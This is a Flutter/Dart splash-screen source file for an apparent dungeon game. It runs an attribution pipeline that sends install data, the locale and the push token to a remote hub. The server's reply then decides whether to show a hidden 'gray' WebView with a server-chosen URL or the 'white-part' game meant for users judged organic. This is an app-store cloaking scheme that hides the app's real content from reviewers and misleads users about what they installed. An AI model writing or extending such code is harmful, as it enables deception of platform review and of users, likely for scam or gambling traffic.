import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../infra/cold_tap_reader.dart';
import '../infra/dungeon_vault.dart';
import '../infra/hub_dispatch.dart';
import '../infra/install_tracker.dart';
import '../infra/net_probe.dart';
import '../infra/signal_relay.dart';
import '../models/route_mode.dart';
import 'offline_screen.dart';
import 'signal_screen.dart';
import 'vault_browser.dart';
import '../infra/hub_log.dart';

enum _LoadStep { empty, midway, done }

/// ★ Core dungeon hub splash. Shows the loading video while running the
/// attribution pipeline, then routes to WebView (gray) or the game (white).
class VaultSplash extends StatefulWidget {
  final DungeonVault vault;
  final NetProbe probe;
  final InstallTracker tracker;
  final HubDispatch dispatch;
  final SignalRelay relay;

  /// Callback invoked when the hub decides the user is organic and should see
  /// the white-part game. Replace with your actual game navigation.
  final VoidCallback onLaunchGame;

  const VaultSplash({
    super.key,
    required this.vault,
    required this.probe,
    required this.tracker,
    required this.dispatch,
    required this.relay,
    required this.onLaunchGame,
  });

  @override
  State<VaultSplash> createState() => _VaultSplashState();
}

class _VaultSplashState extends State<VaultSplash>
    with SingleTickerProviderStateMixin {
  bool _routed = false;

  late final AnimationController _dotController;
  late final AnimationController _barController;
  double _barProgress = 0.0;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);
    _dotController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 600),
    )..repeat();
    _barController = AnimationController(vsync: this)
      ..addListener(() {
        if (mounted) setState(() => _barProgress = _barController.value);
      });
    _launch();
  }

  @override
  void dispose() {
    widget.relay.onTokenRefresh = null;
    _dotController.dispose();
    _barController.dispose();
    super.dispose();
  }

  void _setStep(_LoadStep s) {
    if (!mounted) return;
    setState(() {});
    final target = switch (s) {
      _LoadStep.empty  => 0.05,
      _LoadStep.midway => 0.55,
      _LoadStep.done   => 1.0,
    };
    _barController.animateTo(
      target,
      duration: const Duration(milliseconds: 450),
      curve: Curves.easeOut,
    );
  }

  Future<void> _launch() async {
    widget.relay.onTokenRefresh = _onTokenRefresh;

    // HIGHEST PRIORITY: read cold-start push URL from SceneDelegate.
    // Must happen BEFORE any other async work to avoid race conditions.
    final nativeColdUrl = await ColdTapReader.consumeTapUrl();
    if (nativeColdUrl != null && nativeColdUrl.isNotEmpty) {
      hubLog(() => '[DGA.VS] native cold-start url → $nativeColdUrl');
      await widget.vault.writeMode(RouteMode.web);
      await widget.vault.consumeOneShotUrl();
      unawaited(_backgroundDispatch());
      _openContent(nativeColdUrl);
      return;
    }

    _setStep(_LoadStep.empty);
    final mode = widget.vault.readMode();

    switch (mode) {
      case RouteMode.web:
        _setStep(_LoadStep.midway);
        final pushFuture = widget.relay.bootstrap().catchError((_) {});
        await _runWebMode(pushFuture: pushFuture);
        break;
      case RouteMode.game:
        _setStep(_LoadStep.midway);
        unawaited(widget.relay.bootstrap().catchError((_) {}));
        final recovered = await _tryRestoreWebMode();
        if (recovered) return;
        _setStep(_LoadStep.done);
        await Future.delayed(const Duration(milliseconds: 600));
        _openGame();
        break;
      case RouteMode.fresh:
        await widget.relay.bootstrap().catchError((_) {});
        await _runFreshMode();
        break;
    }
  }


  Future<void> _backgroundDispatch() async {
    try {
      await Future.wait([
        widget.relay.bootstrap().catchError((_) {}),
        widget.tracker.warmup().catchError((_) {}),
      ]);
      await Future.wait([
        widget.tracker.awaitConversion(
            timeout: const Duration(seconds: 6)),
        widget.tracker.awaitDeepLink(),
      ]);
      final body = await widget.tracker.buildPayload(
        locale: Platform.localeName.replaceAll('-', '_'),
        pushToken: widget.relay.token,
      );
      await widget.dispatch.send(body);
    } catch (e) {
      hubLog(() => '[DGA.VS] background dispatch error: $e');
    }
  }

  void _onTokenRefresh(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.tracker.buildPayload(
      locale: locale,
      pushToken: token,
    );
    widget.dispatch.send(body);
  }

  Future<void> _runFreshMode() async {
    _setStep(_LoadStep.empty);
    final online = await widget.probe.isOnline();
    if (!online) { if (mounted) _openOffline(fresh: true); return; }

    _setStep(_LoadStep.midway);
    await widget.tracker.warmup();
    await Future.wait([
      widget.tracker.awaitConversion(),
      widget.tracker.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.tracker.buildPayload(
      locale: locale,
      pushToken: widget.relay.token,
    );
    final reply = await widget.dispatch.send(body);

    if (reply.granted && reply.destination != null) {
      await widget.vault.writeMode(RouteMode.web);
      _setStep(_LoadStep.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _openContent(reply.destination!);
    } else {
      await widget.vault.writeMode(RouteMode.game);
      _setStep(_LoadStep.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _openGame();
    }
  }

  Future<void> _runWebMode({Future<void>? pushFuture}) async {
    final netFuture = widget.probe.isOnline();
    if (pushFuture != null) await Future.wait([netFuture, pushFuture]);
    final online = await netFuture;

    if (!online) {
      _setStep(_LoadStep.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _openOffline(fresh: false);
      return;
    }

    final oneShotUrl = await widget.vault.consumeOneShotUrl();
    if (oneShotUrl != null) {
      _setStep(_LoadStep.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _openContent(oneShotUrl);
      return;
    }

    final sigFuture = widget.tracker.warmup();
    final savedUrl = await widget.vault.readSavedUrl();
    await sigFuture;
    await Future.wait([
      widget.tracker.awaitConversion(timeout: const Duration(seconds: 5)),
      widget.tracker.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.tracker.buildPayload(
      locale: locale,
      pushToken: widget.relay.token,
    );
    final reply = await widget.dispatch.send(body);

    _setStep(_LoadStep.done);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (reply.granted && reply.destination != null) {
      _openContent(reply.destination!);
      return;
    }
    if (savedUrl != null) {
      _openContent(savedUrl);
    } else {
      _openOffline(fresh: false);
    }
  }

  Future<bool> _tryRestoreWebMode() async {
    final online = await widget.probe.isOnline();
    if (!online) return false;
    await widget.tracker.warmup();
    await Future.wait([
      widget.tracker.awaitConversion(timeout: const Duration(seconds: 8)),
      widget.tracker.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.tracker.buildPayload(
      locale: locale,
      pushToken: widget.relay.token,
    );
    final reply = await widget.dispatch.send(body);
    if (!(reply.granted && reply.destination != null)) return false;
    await widget.vault.writeMode(RouteMode.web);
    _setStep(_LoadStep.done);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return true;
    _openContent(reply.destination!);
    return true;
  }

  void _openContent(String url) {
    if (_routed) return;
    _routed = true;
    if (widget.vault.needsPushPrompt()) {
      widget.relay.shouldOfferConsent().then((canAsk) {
        if (!mounted) return;
        if (canAsk) {
          Navigator.of(context).pushReplacement(MaterialPageRoute(
            builder: (_) => SignalScreen(
              vault: widget.vault,
              relay: widget.relay,
              probe: widget.probe,
              destination: url,
              onTokenReady: (token) async {
                final locale = Platform.localeName.replaceAll('-', '_');
                final body = await widget.tracker.buildPayload(
                  locale: locale,
                  pushToken: token,
                );
                widget.dispatch.send(body);
              },
            ),
          ));
        } else {
          _directBrowser(url);
        }
      });
    } else {
      _directBrowser(url);
    }
  }

  void _directBrowser(String url) {
    if (!mounted) return;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => VaultBrowser(
        destination: url,
        vault: widget.vault,
        relay: widget.relay,
        probe: widget.probe,
      ),
    ));
  }

  // ── WHITE-PART INTEGRATION POINT ─────────────────────────────────────
  // Called when the hub decides user is organic — launch the game.
  void _openGame() {
    if (_routed) return;
    _routed = true;
    widget.onLaunchGame();
  }

  void _openOffline({required bool fresh}) {
    if (_routed) return;
    _routed = true;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => OfflineScreen(
        probe: widget.probe,
        retryBuilder: (_) => VaultSplash(
          vault: widget.vault,
          probe: widget.probe,
          tracker: widget.tracker,
          dispatch: widget.dispatch,
          relay: widget.relay,
          onLaunchGame: widget.onLaunchGame,
        ),
      ),
    ));
  }

  @override
  Widget build(BuildContext context) {
    final mq = MediaQuery.of(context);
    final landscape = mq.orientation == Orientation.landscape;
    final bgAsset = landscape
        ? 'assets/loading/splash_landscape.png'
        : 'assets/loading/splash_portrait.png';
    final barW = landscape
        ? (mq.size.width * 0.55).clamp(240.0, 500.0)
        : (mq.size.width * 0.70).clamp(200.0, 420.0);

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        fit: StackFit.expand,
        children: [
          Image.asset(bgAsset, fit: BoxFit.cover),
          const DecoratedBox(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                stops: [0.45, 0.75, 1.0],
                colors: [Colors.transparent, Color(0xAA000000), Color(0xDD000000)],
              ),
            ),
          ),
          SafeArea(
            child: Align(
              alignment: Alignment.bottomCenter,
              child: Padding(
                padding: EdgeInsets.fromLTRB(
                  landscape ? 40 : 28, 0,
                  landscape ? 40 : 28,
                  landscape ? 18 : 28,
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(
                      width: barW,
                      height: 22,
                      child: CustomPaint(
                        painter: _VaultBarPainter(progress: _barProgress),
                      ),
                    ),
                    const SizedBox(height: 10),
                    AnimatedBuilder(
                      animation: _dotController,
                      builder: (context, child) {
                        final dots = '.' *
                            (1 + (_dotController.value * 3).floor() % 3);
                        return Text(
                          'Loading$dots',
                          style: const TextStyle(
                            color: Color(0xFFFFE082),
                            fontSize: 15,
                            fontWeight: FontWeight.w700,
                            letterSpacing: 1.2,
                            shadows: [Shadow(color: Colors.black87, blurRadius: 6)],
                          ),
                        );
                      },
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _VaultBarPainter extends CustomPainter {
  const _VaultBarPainter({required this.progress});

  final double progress;

  @override
  void paint(Canvas canvas, Size size) {
    final r = size.height / 2;
    final rect = Rect.fromLTWH(0, 0, size.width, size.height);
    final rrect = RRect.fromRectAndRadius(rect, Radius.circular(r));

    canvas.drawRRect(rrect, Paint()..color = const Color(0xFF1A1200));
    canvas.drawRRect(
      rrect,
      Paint()
        ..style = PaintingStyle.stroke
        ..strokeWidth = 2
        ..color = const Color(0xFF8B6914),
    );

    final fillW = (size.width * progress).clamp(0.0, size.width);
    if (fillW > 0) {
      final fillRect = Rect.fromLTWH(0, 0, fillW, size.height);
      final fillRRect = RRect.fromRectAndRadius(fillRect, Radius.circular(r));
      canvas.save();
      canvas.clipRRect(rrect);
      canvas.drawRRect(
        fillRRect,
        Paint()
          ..shader = const LinearGradient(
            colors: [Color(0xFFFFD740), Color(0xFFFF8F00)],
          ).createShader(fillRect),
      );
      canvas.drawRRect(
        RRect.fromRectAndRadius(
          Rect.fromLTWH(0, 0, fillW, size.height * 0.45),
          Radius.circular(r),
        ),
        Paint()..color = Colors.white.withValues(alpha: 0.18),
      );
      if (progress > 0.02 && progress < 0.99) {
        final sparkX = fillW - 4;
        canvas.drawRect(
          Rect.fromLTWH(sparkX, 0, 4, size.height),
          Paint()
            ..shader = LinearGradient(
              colors: [
                Colors.white.withValues(alpha: 0),
                Colors.white.withValues(alpha: 0.55),
                Colors.white.withValues(alpha: 0),
              ],
              begin: Alignment.centerLeft,
              end: Alignment.centerRight,
            ).createShader(Rect.fromLTWH(sparkX, 0, 4, size.height)),
        );
      }
      canvas.restore();
    }

    final tickPaint = Paint()
      ..color = Colors.black.withValues(alpha: 0.18)
      ..strokeWidth = 1.5;
    for (int i = 1; i < 4; i++) {
      final x = size.width * i / 4;
      canvas.drawLine(Offset(x, size.height * 0.2), Offset(x, size.height * 0.8), tickPaint);
    }
  }

  @override
  bool shouldRepaint(covariant _VaultBarPainter old) => old.progress != progress;
}
